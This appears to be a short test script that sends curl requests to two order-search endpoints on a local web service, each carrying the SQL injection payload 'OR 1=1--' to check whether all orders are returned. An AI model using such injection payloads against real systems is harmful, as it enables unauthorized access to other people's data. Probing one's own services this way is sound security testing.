#!/bin/bash
echo ""
curl http://localhost:8080/orders/search/findByOrderID?orderID=10248+OR+1=1--
echo ""
curl http://localhost:8080/restorders/search/findByOrderID?orderID=10248+OR+1=1--
echo ""
